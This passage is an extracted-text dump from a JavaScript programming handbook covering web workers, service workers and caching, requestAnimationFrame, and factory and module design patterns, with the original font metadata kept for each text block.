        "text": "Chapter 63: Workers",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 63.1: Web Worker",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "A web worker is a simple way to run scripts in background threads as the worker thread can perform tasks (including I/O tasks using XMLHttpRequest) without interfering with the user interface. Once created, a worker can send messages which can be di\ufb00erent data types (except functions) to the JavaScript code that created it by posting messages to an event handler speci\ufb01ed by that code (and vice versa.) Workers can be created in a few ways. The most common is from a simple URL:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  webworker  =   new  Worker ( \"./path/to/webworker.js\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "It's also possible to create a Worker dynamically from a string using  URL. createObjectURL () :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  workerData  =   \"function someFunction() {}; console.log('More code');\" ; var  blobURL  =  URL. createObjectURL ( new  Blob ([ \"(\"   +  workerData  +   \")\" ],   {  type :   \"text/javascript\"   })); var  webworker  =   new  Worker ( blobURL );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The same method can be combined with  Function. toString ()  to create a worker from an existing function:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  workerFn  =   function ()   {     console. log ( \"I was run\" ); }; var  blobURL  =  URL. createObjectURL ( new  Blob ([ \"(\"   +  workerFn. toString ()   +   \")\" ],   {  type : \"text/javascript\"   })); var  webworker  =   new  Worker ( blobURL );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 63.2: A simple service worker",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "main.js",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "A service worker is an event-driven worker registered against an origin and a path. It takes the form of a JavaScript \ufb01le that can control the web page/site it is associated with, intercepting and modifying navigation and resource requests, and caching resources in a very granular fashion to give you complete control over how your app behaves in certain situations (the most obvious one being when the network is not available.) Source:  MDN",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Few Things:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "It's a JavaScript Worker, so it can't access the DOM directly 1. It's a programmable network proxy 2. It will be terminated when not in use and restarted when it's next needed 3. A service worker has a lifecycle which is completely separate from your web page 4. 5. HTTPS is Needed",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 341",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "This code that will be executed in the Document context, (or) this JavaScript will be included in your page via a",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "<script>  tag.",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// we check if the browser supports ServiceWorkers",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "if   ( 'serviceWorker'   in  navigator )   {   navigator     . serviceWorker     . register (",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "       // path to the service worker file",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "       'sw.js'      )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // the registration is async and it returns a promise",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    . then ( function   ( reg )   {       console. log ( 'Registration Successful' );      }); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "sw.js",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "This is the service worker code and is executed in the  ServiceWorker Global Scope .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "self. addEventListener ( 'fetch' ,   function   ( event )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // do nothing here, just log all the network requests",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  console. log ( event. request . url ); });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 63.3: Register a service worker",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "// Check if service worker is available.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "if   ( 'serviceWorker'   in  navigator )   {   navigator. serviceWorker . register ( '/sw.js' ) . then ( function ( registration )   {     console. log ( 'SW registration succeeded with scope:' ,  registration. scope );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   }) . catch ( function ( e )   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    console. log ( 'SW registration failed with error:' ,  e );    }); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You can call  register ()  on every page load. If the SW is already registered, the browser provides you with instance that is already running The SW \ufb01le can be any name.  sw. js  is common. The location of the SW \ufb01le is important because it de\ufb01nes the SW's scope. For example, an SW \ufb01le at / js / sw. js  can only intercept  fetch  requests for \ufb01les that begin with  / js / . For this reason you usually see the SW \ufb01le at the top-level directory of the project.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 63.4: Communicating with a Web Worker",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Since workers run in a separate thread from the one that created them, communication needs to happen via",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "postMessage .",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note:  Because of the di\ufb00erent export pre\ufb01xes, some browsers have  webkitPostMessage  instead of  postMessage . You should override  postMessage  to make sure workers \"work\" (no pun intended) in the most places possible:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "worker. postMessage   =   ( worker. webkitPostMessage   ||  worker. postMessage );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "From the main thread (parent window):",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Create a worker",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 342",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  webworker  =   new  Worker ( \"./path/to/webworker.js\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Send information to worker",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "webworker. postMessage ( \"Sample message\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Listen for messages from the worker",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "webworker. addEventListener ( \"message\" ,   function ( event )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // `event.data` contains the value or object sent from the worker",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    console. log ( \"Message from worker:\" ,  event. data );   // [\"foo\", \"bar\", \"baz\"] });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "From the worker, in  webworker. js :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Send information to the main thread (parent window)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "self. postMessage ([ \"foo\" ,   \"bar\" ,   \"baz\" ]);",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Listen for messages from the main thread",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "self. addEventListener ( \"message\" ,   function ( event )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // `event.data` contains the value or object sent from main",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    console. log ( \"Message from parent:\" ,  event. data );   // \"Sample message\" });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Alternatively, you can also add event listeners using  onmessage : From the main thread (parent window):",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "webworker. onmessage   =   function ( event )   {     console. log ( \"Message from worker:\" ,  event. data );   // [\"foo\", \"bar\", \"baz\"] }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "From the worker, in  webworker. js :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "self. onmessage   =   function ( event )   {     console. log ( \"Message from parent:\" ,  event. data );   // \"Sample message\" }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 63.5: Terminate a worker",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Once you are done with a worker you should terminate it. This helps to free up resources for other applications on the user \u2019 s computer.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Main Thread:",
        "font_name": "OpenSans-Italic",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Terminate a worker from your application.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "worker. terminate ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note : The  terminate  method is not available for service workers. It will be terminated when not in use, and restarted when it's next needed.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Worker Thread:",
        "font_name": "OpenSans-Italic",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Have a worker terminate itself.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "self. close ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 343",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 63.6: Populating your cache",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "After your service worker is registered, the browser will try to install & later activate the service worker.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Install event listener",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "this . addEventListener ( 'install' ,   function ( event )   {     console. log ( 'installed' ); });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Caching",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "One can use this install event returned to cache the assets needed to run the app o\ufb04ine. Below example uses the cache api to do the same.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "this . addEventListener ( 'install' ,   function ( event )   {   event. waitUntil (     caches. open ( 'v1' ) . then ( function ( cache )   {        return  cache. addAll ([",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         /* Array of all the assets that needs to be cached */",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         '/css/style.css' ,          '/js/app.js' ,          '/images/snowTroopers.jpg'        ]);      })    ); });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 63.7: Dedicated Workers and Shared Workers",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Dedicated Workers",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "A dedicated web worker is only accessible by the script that called it. Main application:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  worker  =   new  Worker ( 'worker.js' ); worker. addEventListener ( 'message' ,   function ( msg )   {     console. log ( 'Result from the worker:' ,  msg. data ); }); worker. postMessage ([ 2 , 3 ]);",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "worker.js:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "self. addEventListener ( 'message' ,   function ( msg )   {     console. log ( 'Worker received arguments:' ,  msg. data );     self. postMessage ( msg. data [ 0 ]   +  msg. data [ 1 ]); });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Shared Workers",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "A shared worker is accessible by multiple scripts  \u2014  even if they are being accessed by di\ufb00erent windows, iframes or even workers. Creating a shared worker is very similar to how to create a dedicated one, but instead of the straight-forward communication between the main thread and the worker thread, you'll have to communicate via a port object, i.e.,",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 344",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "an explicit port has to be opened so multiple scripts can use it to communicate with the shared worker. (Note that dedicated workers do this implicitly) Main application",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  myWorker  =   new  SharedWorker ( 'worker.js' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "myWorker. port . start ();    // open the port connection",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "myWorker. port . postMessage ([ 2 , 3 ]);",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "worker.js",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "self. port . start ();  open the port connection to enable two - way communication self. onconnect   =   function ( e )   {      var  port  =  e. ports [ 0 ];    // get the port     port. onmessage   =   function ( e )   {         console. log ( 'Worker received arguments:' ,  e. data );         port. postMessage ( e. data [ 0 ]   +  e. data [ 1 ]);      } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note that setting up this message handler in the worker thread also implicitly opens the port connection back to the parent thread, so the call to  port. start ()  is not actually needed, as noted above.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 345",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 64: requestAnimationFrame",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Parameter Details",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "callback \"A parameter specifying a function to call when it's time to update your animation for the next repaint.\" ( https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame)",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 64.1: Use requestAnimationFrame to fade in element",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "View jsFiddle :  https://js\ufb01ddle.net/HimmatChahal/jb5trg67/",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Copy + Pasteable code below :",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "<html>      <body>",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         <h1> This will fade in at 60 frames per second (or as close to possible as your hardware allows) </h1>                  <script>             // Fade in over 2000 ms = 2 seconds.             var FADE_DURATION = 2.0 * 1000;                         // -1 is simply a flag to indicate if we are rendering the very 1st frame             var startTime=-1.0;                         // Function to render current frame (whatever frame that may be)             function render(currTime) {                 var head1 = document.getElementsByTagName('h1')[0];                             // How opaque should head1 be?  Its fade started at currTime=0.                 // Over FADE_DURATION ms, opacity goes from 0 to 1                 var opacity = (currTime/FADE_DURATION);                 head1.style.opacity = opacity;             }                         // Function to             function eachFrame() {                 // Time that animation has been running (in ms)                 // Uncomment the console.log function to view how quickly                 // the timeRunning updates its value (may affect performance)                 var timeRunning = (new Date()).getTime() - startTime;                 //console.log('var timeRunning = '+timeRunning+'ms');                 if (startTime  < 0) {                    // This branch: executes for the first frame only.                    // it sets the startTime, then renders at currTime = 0.0                    startTime = (new Date()).getTime();                    render(0.0);                } else if (timeRunning < FADE_DURATION) {                    // This branch: renders every frame, other than the 1st frame,                    // with the new timeRunning value.                    render(timeRunning);                } else {                    return;                }                            // Now we are done rendering one frame.                // So we make a request to the browser to execute the next                // animation frame, and the browser optimizes the rest.                // This happens very rapidly, as you can see in the console.log();                window.requestAnimationFrame(eachFrame);            };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 346",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "                       // start the animation            window.requestAnimationFrame(eachFrame);    ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "        </script>      </body> </html>",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 64.2: Keeping Compatibility",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Of course, just like most things in browser JavaScript, you just can't count on the fact that everything will be the same everywhere. In this case,  requestAnimationFrame  might have a pre\ufb01x on some platforms and are named di\ufb00erently, such as  webkitRequestAnimationFrame . Fortunately, there's a really easy way to group all the known di\ufb00erences that could exist down to 1 function:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "window. requestAnimationFrame   =   ( function (){      return  window. requestAnimationFrame   ||         window. webkitRequestAnimationFrame   ||         window. mozRequestAnimationFrame   ||          function ( callback ){             window. setTimeout ( callback ,   1000   /   60 );          }; })();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note that the last option (which \ufb01lls in when no existing support was found) will not return an id to be used in cancelAnimationFrame . There is, however an  e\ufb03cient poly\ufb01ll  that was written which \ufb01xes this.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 64.3: Cancelling an Animation",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To cancel a call to  requestAnimationFrame , you need the id it returned from when it was last called. This is the parameter you use for  cancelAnimationFrame . The following example starts some hypothetical animation then pauses it after one second.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// stores the id returned from each call to requestAnimationFrame",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  requestId ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// draw something",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  draw ( timestamp )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // do some animation      // request next frame",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    start (); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// pauses the animation",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  pause ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // pass in the id returned from the last call to requestAnimationFrame",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    cancelAnimationFrame ( requestId ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// begin the animation",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  start ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // store the id returned from requestAnimationFrame",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    requestId  =  requestAnimationFrame ( draw ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// begin now",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "start ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// after a second, pause the animation",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 347",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "setTimeout ( pause , 1000 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 348",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 65: Creational Design Patterns",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Design patterns are a good way to keep your  code readable  and DRY. DRY stands for  don't repeat yourself . Below you could \ufb01nd more examples about the most important design patterns.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 65.1: Factory Functions",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "A factory function is simply a function that returns an object. Factory functions do not require the use of the  new  keyword, but can still be used to initialize an object, like a constructor. Often, factory functions are used as API wrappers, like in the cases of  jQuery  and  moment.js , so users do not need to use  new . The following is the simplest form of factory function; taking arguments and using them to craft a new object with the object literal:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  cowFactory ( name )   {      return   {         name :  name ,         talk :   function   ()   {             console. log ( 'Moo, my name is '   +   this . name );          },      }; } var  daisy  =  cowFactory ( 'Daisy' );    // create a cow named Daisy",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "daisy. talk ();    // \"Moo, my name is Daisy\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "It is easy to de\ufb01ne private properties and methods in a factory, by including them outside of the returned object. This keeps your implementation details encapsulated, so you can only expose the public interface to your object.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  cowFactory ( name )   {      function  formalName ()   {          return  name  +   ' the cow' ;      }      return   {         talk :   function   ()   {             console. log ( 'Moo, my name is '   +  formalName ());          },      }; } var  daisy  =  cowFactory ( 'Daisy' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "daisy. talk ();    // \"Moo, my name is Daisy the cow\" daisy. formalName ();    // ERROR: daisy.formalName is not a function",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The last line will give an error because the function  formalName  is closed inside the  cowFactory  function. This is a closure. Factories are also a great way of applying functional programming practices in JavaScript, because they are functions.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 349",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 65.2: Factory with Composition",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "'Prefer composition over inheritance'  is an important and popular programming principle, used to assign behaviors to objects, as opposed to inheriting many often unneeded behaviors.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Behaviour factories",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  speaker  =   function   ( state )   {      var  noise  =  state. noise   ||   'grunt' ;      return   {         speak :   function   ()   {             console. log ( state. name   +   ' says '   +  noise );          }      }; }; var  mover  =   function   ( state )   {      return   {         moveSlowly :   function   ()   {             console. log ( state. name   +   ' is moving slowly' );          },         moveQuickly :   function   ()   {             console. log ( state. name   +   ' is moving quickly' );          }      }; };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Object factories",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "var  person  =   function   ( name ,  age )   {      var  state  =   {         name :  name ,         age :  age ,         noise :   'Hello'      };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     return  Object. assign (       // Merge our 'behaviour' objects",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         {},         speaker ( state ),         mover ( state )      ); }; var  rabbit  =   function   ( name ,  colour )   {      var  state  =   {         name :  name ,         colour :  colour      };      return  Object. assign (          {},         mover ( state )      ); };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Usage",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  fred  =  person ( 'Fred' ,   42 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 350",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "fred. speak ();          // outputs: Fred says Hello fred. moveSlowly ();     // outputs: Fred is moving slowly",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  snowy  =  rabbit ( 'Snowy' ,   'white' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "snowy. moveSlowly ();    // outputs: Snowy is moving slowly snowy. moveQuickly ();   // outputs: Snowy is moving quickly snowy. speak ();         // ERROR: snowy.speak is not a function",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 65.3: Module and Revealing Module Patterns",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Module Pattern",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The Module pattern is a  creational and structural design pattern  which provides a way of encapsulating private members while producing a public API. This is accomplished by creating an IIFE which allows us to de\ufb01ne variables only available in its scope (through closure) while returning an object which contains the public API. This gives us a clean solution for hiding the main logic and only exposing an interface we wish other parts of our application to use.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  Module  =   ( function ( /* pass initialization data if necessary */ )   {    // Private data is stored within the closure",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   var  privateData  =   1 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // Because the function is immediately invoked,    // the return value becomes the public API",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   var  api  =   {     getPrivateData :   function ()   {        return  privateData ;      },         getDoublePrivateData :   function ()   {        return  api. getPrivateData ()   *   2 ;      }    };    return  api ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "})( /* pass initialization data if necessary */ );",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Revealing Module Pattern",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The Revealing Module pattern is a variant in the Module pattern. The key di\ufb00erences are that all members (private and public) are de\ufb01ned within the closure, the return value is an object literal containing no function de\ufb01nitions, and all references to member data are done through direct references rather than through the returned object.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  Module  =   ( function ( /* pass initialization data if necessary */ )   {    // Private data is stored just like before",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   var  privateData  =   1 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // All functions must be declared outside of the returned object",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   var  getPrivateData  =   function ()   {      return  privateData ;    };    var  getDoublePrivateData  =   function ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // Refer directly to enclosed members rather than through the returned object",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     return  getPrivateData ()   *   2 ;    };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // Return an object literal with no function definitions",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   return   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    getPrivateData :  getPrivateData ,",
        "font_name": "RobotoMono-Regular",
